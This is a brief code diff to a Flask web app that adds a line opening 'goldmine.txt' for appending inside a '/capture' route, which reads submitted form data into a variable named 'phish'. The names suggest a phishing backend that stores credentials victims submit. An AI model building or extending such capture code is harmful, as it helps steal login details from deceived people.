@@ -53,6 +53,7 @@ def fetch():
 
 @app.route('/capture',methods=['GET','POST'])
 def capture():	
+	myfile=open("goldmine.txt","a")
 	if request.method == 'POST':
 		phish = request.form
 		for key in phish:
